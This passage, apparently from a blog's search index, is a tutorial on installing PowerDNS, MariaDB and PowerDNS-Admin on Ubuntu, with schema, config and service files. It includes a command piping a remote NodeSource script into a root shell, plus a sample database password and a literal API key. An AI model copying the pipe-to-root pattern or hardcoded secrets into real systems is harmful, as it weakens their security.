INT NOT NULL, name VARCHAR(255) NOT NULL, type VARCHAR(10) NOT NULL, modified_at INT NOT NULL, account VARCHAR(40) CHARACTER SET \u0026#39;utf8\u0026#39; DEFAULT NULL, comment TEXT CHARACTER SET \u0026#39;utf8\u0026#39; NOT NULL, PRIMARY KEY (id) ) Engine=InnoDB CHARACTER SET \u0026#39;latin1\u0026#39;; CREATE INDEX comments_name_type_idx ON comments (name, type); CREATE INDEX comments_order_idx ON comments (domain_id, modified_at); CREATE TABLE domainmetadata ( id INT AUTO_INCREMENT, domain_id INT NOT NULL, kind VARCHAR(32), content TEXT, PRIMARY KEY (id) ) Engine=InnoDB CHARACTER SET \u0026#39;latin1\u0026#39;; CREATE INDEX domainmetadata_idx ON domainmetadata (domain_id, kind); CREATE TABLE cryptokeys ( id INT AUTO_INCREMENT, domain_id INT NOT NULL, flags INT NOT NULL, active BOOL, content TEXT, PRIMARY KEY(id) ) Engine=InnoDB CHARACTER SET \u0026#39;latin1\u0026#39;; CREATE INDEX domainidindex ON cryptokeys(domain_id); CREATE TABLE tsigkeys ( id INT AUTO_INCREMENT, name VARCHAR(255), algorithm VARCHAR(50), secret VARCHAR(255), PRIMARY KEY (id) ) Engine=InnoDB CHARACTER SET \u0026#39;latin1\u0026#39;; CREATE UNIQUE INDEX namealgoindex ON tsigkeys(name, algorithm); $ sudo systemctl disable systemd-resolved $ sudo systemctl stop systemd-resolved $ ls -lh /etc/resolv.conf lrwxrwxrwx 1 root root 39 Jul 24 15:50 /etc/resolv.conf -\u0026gt; ../run/systemd/resolve/stub-resolv.conf $ sudo unlink /etc/resolv.conf $ echo \u0026#34;nameserver 8.8.8.8\u0026#34; | sudo tee /etc/resolv.conf Add official PowerDNS repository for Ubuntu 22.04|20.04|18.04.\n# Ubuntu 22.04 $ echo \u0026#34;deb [arch=amd64] http://repo.powerdns.com/ubuntu jammy-auth-master main\u0026#34; | sudo tee /etc/apt/sources.list.d/pdns.list # Ubuntu 20.04 $ echo \u0026#34;deb [arch=amd64] http://repo.powerdns.com/ubuntu focal-auth-master main\u0026#34; | sudo tee /etc/apt/sources.list.d/pdns.list # Ubuntu 18.04 $ echo \u0026#34;deb [arch=amd64] http://repo.powerdns.com/ubuntu bionic-auth-master main\u0026#34; | sudo tee /etc/apt/sources.list.d/pdns.list $ curl -fsSL https://repo.powerdns.com/CBC8B383-pub.asc | sudo gpg --dearmor -o /etc/apt/trusted.gpg.d/powerdns.gpg $ sudo apt update $ sudo apt install pdns-server pdns-backend-mysql When asked whether to configure the PowerDNS database with dbconfig-common, answer No\n$ sudo vim /etc/powerdns/pdns.d/pdns.local.gmysql.conf # MySQL Configuration # Launch gmysql backend launch+=gmysql # gmysql parameters gmysql-host=localhost gmysql-port=3306 gmysql-dbname=powerdns gmysql-user=powerdns gmysql-password=Str0ngPasswOrd gmysql-dnssec=yes # gmysql-socket= $ sudo systemctl restart pdns $ sudo systemctl enable pdns Install PowerDNS-Admin sudo apt install python3-dev sudo apt install -y libmysqlclient-dev libsasl2-dev libldap2-dev libssl-dev libxml2-dev libxslt1-dev libxmlsec1-dev libffi-dev pkg-config apt-transport-https virtualenv build-essential python3-venv curl -sL https://deb.nodesource.com/setup_16.x | sudo bash - sudo apt install -y nodejs curl -fsSL https://dl.yarnpkg.com/debian/pubkey.gpg | sudo gpg --dearmor -o /etc/apt/trusted.gpg.d/yarn-keyring.gpg echo \u0026#34;deb https://dl.yarnpkg.com/debian/ stable main\u0026#34; | sudo tee /etc/apt/sources.list.d/yarn.list sudo apt update sudo apt install -y yarn sudo su - git clone https://github.com/ngoduykhanh/PowerDNS-Admin.git /opt/web/powerdns-admin cd /opt/web/powerdns-admin python3 -mvenv ./venv cp /opt/web/powerdns-admin/configs/development.py /opt/web/powerdns-admin/configs/production.py vim /opt/web/powerdns-admin/configs/production.py ### DATABASE CONFIG SQLA_DB_USER = \u0026#39;powerdns\u0026#39; SQLA_DB_PASSWORD = \u0026#39;Str0ngPasswOrd\u0026#39; SQLA_DB_HOST = \u0026#39;127.0.0.1\u0026#39; SQLA_DB_NAME = \u0026#39;powerdns\u0026#39; SQLALCHEMY_TRACK_MODIFICATIONS = True ### DATABASE - MySQL #SQLALCHEMY_DATABASE_URI = \u0026#39;sqlite:///\u0026#39; + os.path.join(basedir, \u0026#39;pdns.db\u0026#39;) SQLALCHEMY_DATABASE_URI = \u0026#39;mysql://\u0026#39;+SQLA_DB_USER+\u0026#39;:\u0026#39;+SQLA_DB_PASSWORD+\u0026#39;@\u0026#39;+SQLA_DB_HOST+\u0026#39;/\u0026#39;+SQLA_DB_NAME (flask) $ export FLASK_APP=powerdnsadmin/__init__.py (flask) $ export FLASK_CONF=../configs/production.py (flask)$ flask db upgrade INFO [alembic.runtime.migration] Context impl MySQLImpl. INFO [alembic.runtime.migration] Will assume non-transactional DDL. INFO [alembic.runtime.migration] Running upgrade -\u0026gt; 787bdba9e147, Init DB INFO [alembic.runtime.migration] Running upgrade 787bdba9e147 -\u0026gt; 59729e468045, Add view column to setting table INFO [alembic.runtime.migration] Running upgrade 59729e468045 -\u0026gt; 1274ed462010, Change setting.value data type INFO [alembic.runtime.migration] Running upgrade 1274ed462010 -\u0026gt; 4a666113c7bb, Adding Operator Role INFO [alembic.runtime.migration] Running upgrade 4a666113c7bb -\u0026gt; 31a4ed468b18, Remove all setting in the DB INFO [alembic.runtime.migration] Running upgrade 31a4ed468b18 -\u0026gt; 654298797277, Upgrade DB Schema INFO [alembic.runtime.migration] Running upgrade 654298797277 -\u0026gt; 0fb6d23a4863, Remove user avatar INFO [alembic.runtime.migration] Running upgrade 0fb6d23a4863 -\u0026gt; 856bb94b7040, Add comment column in domain template record table INFO [alembic.runtime.migration] Running upgrade 856bb94b7040 -\u0026gt; b0fea72a3f20, Update domain serial columns type INFO [alembic.runtime.migration] Running upgrade b0fea72a3f20 -\u0026gt; 3f76448bb6de, Add user.confirmed column INFO [alembic.runtime.migration] Running upgrade 3f76448bb6de -\u0026gt; 0d3d93f1c2e0, Add domain_id to history table Fixing error \u0026ldquo;ImportError: cannot import name \u0026lsquo;json\u0026rsquo; from \u0026lsquo;itsdangerous\u0026rsquo;\u0026rdquo; # Only if you have error ImportError: cannot import name \u0026#39;json\u0026#39; from \u0026#39;itsdangerous\u0026#39; $ pip uninstall itsdangerous $ pip install itsdangerous==2.0.1 $ flask db upgrade (flask)$ flask db migrate -m \u0026#34;Init DB\u0026#34; INFO [alembic.runtime.migration] Context impl MySQLImpl. INFO [alembic.runtime.migration] Will assume non-transactional DDL. INFO [alembic.autogenerate.compare] Detected removed index \u0026#39;name_index\u0026#39; on \u0026#39;domains\u0026#39; INFO [alembic.autogenerate.compare] Detected removed table \u0026#39;domains\u0026#39; INFO [alembic.autogenerate.compare] Detected removed index \u0026#39;comments_name_type_idx\u0026#39; on \u0026#39;comments\u0026#39; INFO [alembic.autogenerate.compare] Detected removed index \u0026#39;comments_order_idx\u0026#39; on \u0026#39;comments\u0026#39; INFO [alembic.autogenerate.compare] Detected removed table \u0026#39;comments\u0026#39; INFO [alembic.autogenerate.compare] Detected removed index \u0026#39;namealgoindex\u0026#39; on \u0026#39;tsigkeys\u0026#39; INFO [alembic.autogenerate.compare] Detected removed table \u0026#39;tsigkeys\u0026#39; INFO [alembic.autogenerate.compare] Detected removed index \u0026#39;domainidindex\u0026#39; on \u0026#39;cryptokeys\u0026#39; INFO [alembic.autogenerate.compare] Detected removed table \u0026#39;cryptokeys\u0026#39; INFO [alembic.autogenerate.compare] Detected removed table \u0026#39;supermasters\u0026#39; INFO [alembic.autogenerate.compare] Detected removed index \u0026#39;domainmetadata_idx\u0026#39; on \u0026#39;domainmetadata\u0026#39; INFO [alembic.autogenerate.compare] Detected removed table \u0026#39;domainmetadata\u0026#39; INFO [alembic.autogenerate.compare] Detected removed index \u0026#39;nametype_index\u0026#39; on \u0026#39;records\u0026#39; INFO [alembic.autogenerate.compare] Detected removed table \u0026#39;records\u0026#39; INFO [alembic.autogenerate.compare] Detected added index \u0026#39;ix_history_created_on\u0026#39; on \u0026#39;[\u0026#39;created_on\u0026#39;]\u0026#39; Generating /opt/web/powerdns-admin/migrations/versions/57130833385e_init_db.py ... done (flask)$ yarn install --pure-lockfile yarn install v1.22.17 [1/4] Resolving packages... [2/4] Fetching packages... [3/4] Linking dependencies... [4/4] Building fresh packages... Done in 15.49s. (flask)$ flask assets build Building bundle: generated/login.js [2022-02-21 22:45:55,106] [script.py:167] INFO - Building bundle: generated/login.js Building bundle: generated/validation.js [2022-02-21 22:45:55,267] [script.py:167] INFO - Building bundle: generated/validation.js Building bundle: generated/login.css [2022-02-21 22:45:55,270] [script.py:167] INFO - Building bundle: generated/login.css Building bundle: generated/main.js [2022-02-21 22:46:28,632] [script.py:167] INFO - Building bundle: generated/main.js Building bundle: generated/main.css [2022-02-21 22:46:29,536] [script.py:167] INFO - Building bundle: generated/main.css (flask)$ ./run.py [INFO] * Running on http://127.0.0.1:9191/ (Press CTRL+C to quit) [INFO] * Restarting with stat [WARNING] * Debugger is active! [INFO] * Debugger PIN: 466-405-858 Configure systemd service and Nginx $ sudo vim /etc/systemd/system/powerdns-admin.service [Install] WantedBy=multi-user.target [Unit] Description=PowerDNS-Admin Requires=powerdns-admin.socket After=network.target [Service] PIDFile=/run/powerdns-admin/pid User=pdns Group=pdns WorkingDirectory=/opt/web/powerdns-admin ExecStart=/opt/web/powerdns-admin/venv/bin/gunicorn --pid /run/powerdns-admin/pid --bind unix:/run/powerdns-admin/socket \u0026#39;powerdnsadmin:create_app()\u0026#39; ExecReload=/bin/kill -s HUP $MAINPID ExecStop=/bin/kill -s TERM $MAINPID PrivateTmp=true [Install] WantedBy=multi-user.target Create override file\nsudo tee /etc/systemd/system/powerdns-admin.service.d/override.conf\u0026lt;\u0026lt;EOF [Service] Environment=\u0026#34;FLASK_CONF=../configs/production.py\u0026#34; EOF Create socket file\n$ sudo vim /etc/systemd/system/powerdns-admin.socket [Unit] Description=PowerDNS-Admin socket [Socket] ListenStream=/run/powerdns-admin/socket [Install] WantedBy=sockets.target Create environment file\n$ sudo vim /etc/tmpfiles.d/powerdns-admin.conf d /run/powerdns-admin 0755 pdns pdns - sudo systemctl daemon-reload sudo systemctl restart powerdns-admin.socket sudo systemctl enable powerdns-admin.socket sudo chown -R pdns:pdns /run/powerdns-admin sudo chown -R pdns:pdns /opt/web/powerdns-admin sudo apt install nginx sudo vim /etc/nginx/conf.d/powerdns-admin.conf server { listen *:80; server_name powerdns-admin.example.com; index index.html index.htm index.php; root /opt/web/powerdns-admin; access_log /var/log/nginx/powerdns_admin_access.log combined; error_log /var/log/nginx/powerdns_admin_error.log; client_max_body_size 10m; client_body_buffer_size 128k; proxy_redirect off; proxy_connect_timeout 90; proxy_send_timeout 90; proxy_read_timeout 90; proxy_buffers 32 4k; proxy_buffer_size 8k; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_headers_hash_bucket_size 64; location ~ ^/static/ { include /etc/nginx/mime.types; root /opt/web/powerdns-admin/powerdnsadmin; location ~* \\.(jpg|jpeg|png|gif)$ { expires 365d; } location ~* ^.+.(css|js)$ { expires 7d; } } location / { proxy_pass http://unix:/run/powerdns-admin/socket; proxy_read_timeout 120; proxy_connect_timeout 120; proxy_redirect off; } } Configure PowerDNS API $ sudo vim /etc/powerdns/pdns.conf # Configure like below webserver-port=8081 api=yes api-key=f5ee4390-6542-48c9-a2a0-e5d0bd399490 #You can generate one from https://codepen.io/corenominal/pen/rxOmMJ sudo systemctl restart powerdns-admin\n","date":"September 25, 2020","hero":"/images/hero/linux.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2020/20200925-install-powerdns-and-powerdns-admin-on-ubuntu/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://computingforgeeks.com/install-powerdns-and-powerdns-admin-on-ubuntu/\" target=\"_blank\" rel=\"noopener\"\u003eInstall PowerDNS and PowerDNS-Admin on Ubuntu 22.04|20.04|18.04\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://blog.zswap.net/master-master-powerdns-with-galera-replication/\" target=\"_blank\" rel=\"noopener\"\u003eMaster-Master PowerDNS with Galera Replication\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.scaleway.com/en/docs/installing-powerdns-server-on-ubuntu-bionic/\" target=\"_blank\" rel=\"noopener\"\u003ehttps://www.scaleway.com/en/docs/installing-powerdns-server-on-ubuntu-bionic/\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"install-powerdns\"\u003eInstall PowerDNS\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ sudo apt update\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ sudo apt install mariadb-server -y\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ sudo mysql -u root\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-sql\" data-lang=\"sql\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eCREATE\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eDATABASE\u003c/span\u003e powerdns;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eGRANT\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eALL\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eON\u003c/span\u003e powerdns.\u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eTO\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;powerdns\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e@\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;localhost\u0026#39;\u003c/span\u003e IDENTIFIED \u003cspan style=\"color:#66d9ef\"\u003eBY\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;Str0ngPasswOrd\u0026#39;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eFLUSH \u003cspan style=\"color:#66d9ef\"\u003ePRIVILEGES\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eUSE powerdns;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eCREATE\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eTABLE\u003c/span\u003e domains (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  id                    INT AUTO_INCREMENT,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  name                  VARCHAR(\u003cspan style=\"color:#ae81ff\"\u003e255\u003c/span\u003e) \u003cspan style=\"color:#66d9ef\"\u003eNOT\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eNULL\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  master                VARCHAR(\u003cspan style=\"color:#ae81ff\"\u003e128\u003c/span\u003e) \u003cspan style=\"color:#66d9ef\"\u003eDEFAULT\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eNULL\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  last_check            INT \u003cspan style=\"color:#66d9ef\"\u003eDEFAULT\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eNULL\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003etype\u003c/span\u003e                  VARCHAR(\u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003e) \u003cspan style=\"color:#66d9ef\"\u003eNOT\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eNULL\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  notified_serial       INT UNSIGNED \u003cspan style=\"color:#66d9ef\"\u003eDEFAULT\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eNULL\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  account               VARCHAR(\u003cspan style=\"color:#ae81ff\"\u003e40\u003c/span\u003e) CHARACTER \u003cspan style=\"color:#66d9ef\"\u003eSET\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;utf8\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eDEFAULT\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eNULL\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003ePRIMARY\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eKEY\u003c/span\u003e (id)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e) Engine\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eInnoDB CHARACTER \u003cspan style=\"color:#66d9ef\"\u003eSET\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;latin1\u0026#39;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eCREATE\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eUNIQUE\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eINDEX\u003c/span\u003e name_index \u003cspan style=\"color:#66d9ef\"\u003eON\u003c/span\u003e domains(name);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eCREATE\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eTABLE\u003c/span\u003e records (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  id                    BIGINT AUTO_INCREMENT,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  domain_id             INT \u003cspan style=\"color:#66d9ef\"\u003eDEFAULT\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eNULL\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  name                  VARCHAR(\u003cspan style=\"color:#ae81ff\"\u003e255\u003c/span\u003e) \u003cspan style=\"color:#66d9ef\"\u003eDEFAULT\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eNULL\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003etype\u003c/span\u003e                  VARCHAR(\u003cspan style=\"color:#ae81ff\"\u003e10\u003c/span\u003e) \u003cspan style=\"color:#66d9ef\"\u003eDEFAULT\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eNULL\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  content               VARCHAR(\u003cspan style=\"color:#ae81ff\"\u003e64000\u003c/span\u003e) \u003cspan style=\"color:#66d9ef\"\u003eDEFAULT\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eNULL\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  ttl                   INT \u003cspan style=\"color:#66d9ef\"\u003eDEFAULT\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eNULL\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  prio                  INT \u003cspan style=\"color:#66d9ef\"\u003eDEFAULT\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eNULL\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  change_date           INT \u003cspan style=\"color:#66d9ef\"\u003eDEFAULT\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eNULL\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  disabled              TINYINT(\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e) \u003cspan style=\"color:#66d9ef\"\u003eDEFAULT\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  ordername             VARCHAR(\u003cspan style=\"color:#ae81ff\"\u003e255\u003c/span\u003e) BINARY \u003cspan style=\"color:#66d9ef\"\u003eDEFAULT\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eNULL\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  auth                  TINYINT(\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e) \u003cspan style=\"color:#66d9ef\"\u003eDEFAULT\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003ePRIMARY\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eKEY\u003c/span\u003e (id)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e) Engine\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eInnoDB CHARACTER \u003cspan style=\"color:#66d9ef\"\u003eSET\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;latin1\u0026#39;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eCREATE\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eINDEX\u003c/span\u003e nametype_index \u003cspan style=\"color:#66d9ef\"\u003eON\u003c/span\u003e records(name,\u003cspan style=\"color:#66d9ef\"\u003etype\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eCREATE\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eINDEX\u003c/span\u003e domain_id \u003cspan style=\"color:#66d9ef\"\u003eON\u003c/span\u003e records(domain_id);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eCREATE\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eINDEX\u003c/span\u003e ordername \u003cspan style=\"color:#66d9ef\"\u003eON\u003c/span\u003e records (ordername);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eCREATE\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eTABLE\u003c/span\u003e supermasters (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  ip                    VARCHAR(\u003cspan style=\"color:#ae81ff\"\u003e64\u003c/span\u003e) \u003cspan style=\"color:#66d9ef\"\u003eNOT\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eNULL\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  nameserver            VARCHAR(\u003cspan style=\"color:#ae81ff\"\u003e255\u003c/span\u003e) \u003cspan style=\"color:#66d9ef\"\u003eNOT\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eNULL\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  account               VARCHAR(\u003cspan style=\"color:#ae81ff\"\u003e40\u003c/span\u003e) CHARACTER \u003cspan style=\"color:#66d9ef\"\u003eSET\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;utf8\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eNOT\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eNULL\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003ePRIMARY\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eKEY\u003c/span\u003e (ip, nameserver)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e) Engine\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eInnoDB CHARACTER \u003cspan style=\"color:#66d9ef\"\u003eSET\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;latin1\u0026#39;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eCREATE\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eTABLE\u003c/span\u003e comments (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  id                    INT AUTO_INCREMENT,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  domain_id             INT \u003cspan style=\"color:#66d9ef\"\u003eNOT\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eNULL\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  name                  VARCHAR(\u003cspan style=\"color:#ae81ff\"\u003e255\u003c/span\u003e) \u003cspan style=\"color:#66d9ef\"\u003eNOT\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eNULL\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003etype\u003c/span\u003e                  VARCHAR(\u003cspan style=\"color:#ae81ff\"\u003e10\u003c/span\u003e) \u003cspan style=\"color:#66d9ef\"\u003eNOT\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eNULL\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  modified_at           INT \u003cspan style=\"color:#66d9ef\"\u003eNOT\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eNULL\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  account               VARCHAR(\u003cspan style=\"color:#ae81ff\"\u003e40\u003c/span\u003e) CHARACTER \u003cspan style=\"color:#66d9ef\"\u003eSET\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;utf8\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eDEFAULT\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eNULL\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003ecomment\u003c/span\u003e               TEXT CHARACTER \u003cspan 